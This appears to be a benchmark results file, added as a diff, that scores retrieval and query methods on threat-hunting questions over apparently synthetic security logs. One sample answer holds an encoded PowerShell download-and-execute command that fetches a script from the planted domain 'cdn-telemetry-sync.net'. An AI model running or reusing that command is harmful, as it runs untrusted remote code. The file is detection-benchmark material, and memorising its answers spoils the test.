@@ -1,0 +1,551 @@
+{
+  "a4_excluded_ill_posed": true,
+  "arms": {
+    "graphrag_flat": {
+      "lookup": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A2": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A6": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A8": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 1.0,
+            "mean": 1.0,
+            "min": 1.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      },
+      "tail": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A3": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A7": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A9": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 1.0,
+            "mean": 1.0,
+            "min": 1.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      }
+    },
+    "graphrag_structured": {
+      "lookup": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A2": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A6": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A8": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 1.0,
+            "mean": 1.0,
+            "min": 1.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      },
+      "tail": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A3": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A7": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          },
+          "A9": {
+            "distinct_outcomes": 1,
+            "majority": "silent"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 1.0,
+            "mean": 1.0,
+            "min": 1.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      }
+    },
+    "metrics_layer": {
+      "excluded": [
+        "A4"
+      ],
+      "lookup": {
+        "counts": {
+          "correct": 3,
+          "loud": 0,
+          "silent": 0
+        },
+        "deterministic": true,
+        "per_query": {
+          "A2": "correct",
+          "A6": "correct",
+          "A8": "correct"
+        },
+        "rates": {
+          "correct": 1.0,
+          "loud": 0.0,
+          "silent": 0.0
+        },
+        "trials": 1
+      },
+      "raw_per_query": {
+        "A1": {
+          "outcome": "loud",
+          "reason": "beacon cadence detection needs per-flow inter-arrival modeling, not a standard agg",
+          "scored": true
+        },
+        "A2": {
+          "cells": 1,
+          "kind": "substring",
+          "outcome": "correct",
+          "sample": [
+            "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHQAZQBsAGUAbQBlAHQAcgB5AC0AcwB5AG4AYwAuAG4AZQB0AC8AcwAnACkA"
+          ],
+          "scored": true
+        },
+        "A3": {
+          "outcome": "loud",
+          "reason": "cross-source kill-chain ordering needs bespoke stage modeling, not a curated metric",
+          "scored": true
+        },
+        "A4": {
+          "nl_anchored_cells": [
+            "45"
+          ],
+          "note": "A4 anchor = NL-derived priv-esc marker time (45), not gold pit (35)",
+          "outcome": "excluded_ill_posed",
+          "scored": false
+        },
+        "A5": {
+          "outcome": "loud",
+          "reason": "identity closure across heterogeneous principals is an entity-resolution task",
+          "scored": true
+        },
+        "A6": {
+          "cells": 1,
+          "kind": "uid",
+          "outcome": "correct",
+          "sample": [
+            "api-needle-nomfa"
+          ],
+          "scored": true
+        },
+        "A7": {
+          "cells": 1,
+          "kind": "scalar",
+          "outcome": "silent",
+          "sample": [
+            "6145.0"
+          ],
+          "scored": true
+        },
+        "A8": {
+          "cells": 1,
+          "kind": "substring",
+          "outcome": "correct",
+          "sample": [
+            "cdn-telemetry-sync.net"
+          ],
+          "scored": true
+        },
+        "A9": {
+          "cells": 1,
+          "kind": "exact_scalar",
+          "outcome": "correct",
+          "sample": [
+            "9"
+          ],
+          "scored": true
+        }
+      },
+      "tail": {
+        "counts": {
+          "correct": 1,
+          "loud": 1,
+          "silent": 1
+        },
+        "deterministic": true,
+        "per_query": {
+          "A3": "loud",
+          "A7": "silent",
+          "A9": "correct"
+        },
+        "rates": {
+          "correct": 0.3333,
+          "loud": 0.3333,
+          "silent": 0.3333
+        },
+        "trials": 1
+      }
+    },
+    "obda_deterministic": {
+      "excluded": [
+        "A4"
+      ],
+      "lookup": {
+        "counts": {
+          "correct": 2,
+          "loud": 1,
+          "silent": 0
+        },
+        "deterministic": true,
+        "per_query": {
+          "A2": "correct",
+          "A6": "correct",
+          "A8": "loud"
+        },
+        "rates": {
+          "correct": 0.6667,
+          "loud": 0.3333,
+          "silent": 0.0
+        },
+        "trials": 1
+      },
+      "raw_per_query": {
+        "A1": {
+          "expressible": false,
+          "outcome": "out_of_expressivity",
+          "reason": "~60s beacon cadence \u2014 needs window/aggregation; OWL2QL is first-order-rewritable (no aggregation)"
+        },
+        "A2": {
+          "expressible": true,
+          "outcome": "correct",
+          "rows_returned": 1,
+          "scored": true
+        },
+        "A3": {
+          "expressible": false,
+          "outcome": "out_of_expressivity",
+          "reason": "cross-source kill-chain ordering \u2014 needs sort/aggregation over joins"
+        },
+        "A4": {
+          "expressible": true,
+          "gold_count": 35,
+          "gold_pit_ms": 1767880980000,
+          "nl_anchor_ms": 1767871200000,
+          "nl_anchored_rows": 45,
+          "note": "A4 EXCLUDED as ill-posed: NL anchor = priv-esc marker event time (1767871200000) -> 45 sessions; gold pit_point_ms (1767880980000) -> 35. The gold pit is tied to no named chain stage; do NOT score A4.",
+          "outcome": "excluded_ill_posed",
+          "scored": false
+        },
+        "A5": {
+          "expressible": false,
+          "outcome": "out_of_expressivity",
+          "reason": "recursive identity closure \u2014 OWL2QL is non-recursive (no transitive closure)"
+        },
+        "A6": {
+          "expressible": true,
+          "outcome": "correct",
+          "rows_returned": 1,
+          "scored": true
+        },
+        "A7": {
+          "expressible": false,
+          "outcome": "out_of_expressivity",
+          "reason": "dwell-time delta \u2014 needs aggregation across events"
+        },
+        "A9": {
+          "expressible": false,
+          "outcome": "out_of_expressivity",
+          "reason": "distinct-asset count \u2014 needs aggregation"
+        }
+      },
+      "tail": {
+        "counts": {
+          "correct": 0,
+          "loud": 0,
+          "silent": 0
+        },
+        "deterministic": true,
+        "per_query": {},
+        "rates": {
+          "correct": 0.0,
+          "loud": 0.0,
+          "silent": 0.0
+        },
+        "trials": 1
+      }
+    },
+    "structured_graph_query": {
+      "lookup": {
+        "n_queries": 0,
+        "per_query_stability": {},
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 0,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 0,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 0,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      },
+      "tail": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A3": {
+            "distinct_outcomes": 1,
+            "majority": "loud"
+          },
+          "A7": {
+            "distinct_outcomes": 1,
+            "majority": "loud"
+          },
+          "A9": {
+            "distinct_outcomes": 1,
+            "majority": "loud"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 1.0,
+            "mean": 1.0,
+            "min": 1.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      }
+    },
+    "text_to_sql": {
+      "lookup": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A2": {
+            "distinct_outcomes": 1,
+            "majority": "correct"
+          },
+          "A6": {
+            "distinct_outcomes": 1,
+            "majority": "correct"
+          },
+          "A8": {
+            "distinct_outcomes": 1,
+            "majority": "correct"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 1.0,
+            "mean": 1.0,
+            "min": 1.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "silent": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          }
+        },
+        "trials": 8
+      },
+      "tail": {
+        "n_queries": 3,
+        "per_query_stability": {
+          "A3": {
+            "distinct_outcomes": 2,
+            "majority": "silent"
+          },
+          "A7": {
+            "distinct_outcomes": 2,
+            "majority": "loud"
+          },
+          "A9": {
+            "distinct_outcomes": 2,
+            "majority": "silent"
+          }
+        },
+        "trial_rates": {
+          "correct": {
+            "max": 0.0,
+            "mean": 0.0,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.0
+          },
+          "loud": {
+            "max": 1.0,
+            "mean": 0.4583,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.2857
+          },
+          "silent": {
+            "max": 1.0,
+            "mean": 0.5417,
+            "min": 0.0,
+            "n_trials": 8,
+            "stdev": 0.2857
+          }
+        },
+        "trials": 8
+      }
+    }
+  },
+  "bench": "BENCH-C v2 head-to-head (integrated, shared scorer)",
+  "hypotheses": [
+    "H-CONCEPT-GRAPH-02",
+    "H-CONCEPT-GRAPH-03"
+  ],
+  "lookup_class": [
+    "A2",
+    "A6",
+    "A8"
+  ],
+  "reporting_order": [
+    "lookup-recall-first (A2/A6/A8)",
+    "tail-as-compute-correctness (A3/A7/A9)"
+  ],
+  "scorer": "scoring.classify (shared, byte-identical)",
+  "tail_class": [
+    "A3",
+    "A4",
+    "A7",
+    "A9"
+  ],
+  "tier": "B"
+}
